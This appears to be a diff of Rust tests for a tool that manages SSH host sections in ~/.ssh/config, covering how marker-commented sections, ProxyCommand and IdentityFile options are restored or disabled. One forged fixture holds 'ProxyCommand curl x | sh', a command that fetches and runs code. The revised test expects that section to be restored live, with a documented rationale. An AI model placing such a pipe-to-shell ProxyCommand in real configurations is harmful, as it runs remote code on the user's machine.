@@ -313,22 +313,70 @@ async fn a_host_that_is_off_from_the_start_is_commented_out_with_no_include() {
     assert_eq!(read(home, ".ssh/config"), original);
 }
 
+/// Accepted: whoever can write a marker in `~/.ssh/config` can write the option
+/// itself (`docs/security.md`), so a section with options written by the person
+/// is given back like any other.
 #[tokio::test]
-async fn a_marker_from_elsewhere_never_switches_a_program_on() {
+async fn a_section_commented_by_the_marker_is_given_back_whatever_options_it_holds() {
     let fixture = fixture();
     let home = fixture.home.path();
     let forged = "#hubergamof-off# Host evil\n#hubergamof-off# \tProxyCommand curl x | sh\n";
     fs::create_dir_all(home.join(".ssh")).unwrap();
     fs::write(home.join(".ssh/config"), forged).unwrap();
     saved(&fixture, |config| config.hosts = vec![host("a")]).await;
+    assert!(read(home, ".ssh/config").ends_with("Host evil\n\tProxyCommand curl x | sh\n"));
+}
+
+#[tokio::test]
+async fn a_section_commented_by_the_marker_with_what_cannot_be_carried_stays_commented() {
+    let fixture = fixture();
+    let home = fixture.home.path();
+    let forged = "#hubergamof-off# Host evil\n#hubergamof-off# \tIdentityFile a\n#hubergamof-off# \tIdentityFile b\n";
+    fs::create_dir_all(home.join(".ssh")).unwrap();
+    fs::write(home.join(".ssh/config"), forged).unwrap();
+    saved(&fixture, |config| config.hosts = vec![host("a")]).await;
     assert!(read(home, ".ssh/config").ends_with(forged));
+}
+
+#[tokio::test]
+async fn a_host_with_its_own_options_is_taken_over_and_really_switches_off_then_comes_back() {
+    let fixture = fixture();
+    let home = fixture.home.path();
+    let original = "Host tunnel\n\tHostName 192.0.2.20\n\tProxyCommand nc %h %p\n\tCompression yes\n\nHost web\n\tUser ada\n";
+    fs::create_dir_all(home.join(".ssh")).unwrap();
+    fs::write(home.join(".ssh/config"), original).unwrap();
+
+    // What the page does when the person takes the host over.
+    let system = fixture.hub.refresh().await.unwrap().system_hosts;
+    let tunnel = system.iter().find(|h| h.alias == "tunnel").unwrap();
+    assert_eq!(tunnel.other_options, Vec::<String>::new());
+    let mut taken = server("tunnel", &tunnel.host_name, "");
+    taken.options = tunnel.options.clone();
+    saved(&fixture, |config| config.hosts = vec![taken]).await;
+
+    let config = read(home, ".ssh/config");
+    assert!(config.contains("#hubergamof-off# Host tunnel"));
+    assert!(config.contains("Host web\n\tUser ada\n"));
+    let managed = home.join(".config/hubergamof/ssh_config");
+    let read_back = ssh_reads(&managed, "tunnel");
     assert_eq!(
-        fs::read_to_string(home.join(".ssh/config"))
-            .unwrap()
-            .matches("\nProxyCommand")
-            .count(),
-        0
+        first(&read_back, "proxycommand").as_deref(),
+        Some("nc %h %p")
     );
+    assert_eq!(first(&read_back, "compression").as_deref(), Some("yes"));
+
+    // Off: gone from the computer, from where it came from too.
+    saved(&fixture, |config| config.hosts[0].enabled = false).await;
+    assert!(!home.join(".config/hubergamof/ssh_config").exists());
+    let effective = ssh_reads_home(home, "tunnel");
+    assert_ne!(
+        first(&effective, "proxycommand").as_deref(),
+        Some("nc %h %p")
+    );
+
+    // Removed from the configuration: back where it was.
+    saved(&fixture, |config| config.hosts.clear()).await;
+    assert_eq!(read(home, ".ssh/config"), original);
 }
 
 #[tokio::test]
@@ -348,7 +396,8 @@ async fn the_hosts_found_are_listed_and_what_hubergamof_wrote_is_not() {
         .map(|h| h.alias.as_str())
         .collect();
     assert_eq!(aliases, ["web", "tunnel"]);
-    assert_eq!(snapshot.system_hosts[1].other_options, ["proxycommand"]);
+    assert_eq!(snapshot.system_hosts[1].other_options, Vec::<String>::new());
+    assert_eq!(snapshot.system_hosts[1].options[0].key, "ProxyCommand");
 
     saved(&fixture, |config| config.hosts = vec![host("mine")]).await;
     let snapshot = fixture.hub.refresh().await.unwrap();
@@ -554,7 +603,7 @@ async fn the_demo_works_in_a_temporary_home_and_lists_its_hosts() {
         .iter()
         .map(|h| h.alias.as_str())
         .collect();
-    assert_eq!(aliases, ["demo-server", "demo-tunnel"]);
+    assert_eq!(aliases, ["demo-server", "demo-tunnel", "demo-keys"]);
 
     let home: PathBuf = hub.target().unwrap().home().to_owned();
     assert!(home.starts_with(std::env::temp_dir()));
@@ -649,7 +698,7 @@ async fn a_name_used_by_a_host_with_options_hubergamof_does_not_manage_is_refuse
  {
     let fixture = fixture();
     let home = fixture.home.path();
-    let original = "Host work\n\tHostName w.example.org\n\tProxyCommand nc -X 5 %h %p\n";
+    let original = "Host work\n\tHostName w.example.org\n\tIdentityFile k1\n\tIdentityFile k2\n";
     fs::create_dir_all(home.join(".ssh")).unwrap();
     fs::write(home.join(".ssh/config"), original).unwrap();
 
@@ -664,7 +713,7 @@ async fn a_name_used_by_a_host_with_options_hubergamof_does_not_manage_is_refuse
     assert_eq!(
         read(home, ".ssh/config"),
         original,
-        "its ProxyCommand is not lost"
+        "its second IdentityFile is not lost"
     );
     assert!(
         !home.join(".config/hubergamof/ssh_config").exists(),
@@ -674,7 +723,7 @@ async fn a_name_used_by_a_host_with_options_hubergamof_does_not_manage_is_refuse
     // Another name is fine, and the host stays listed as one that cannot be taken.
     saved(&fixture, |config| config.hosts = vec![host("other")]).await;
     let snapshot = fixture.hub.refresh().await.unwrap();
-    assert_eq!(snapshot.system_hosts[0].other_options, ["proxycommand"]);
+    assert_eq!(snapshot.system_hosts[0].other_options, ["identityfile"]);
     assert!(read(home, ".ssh/config").ends_with(original));
 }
 
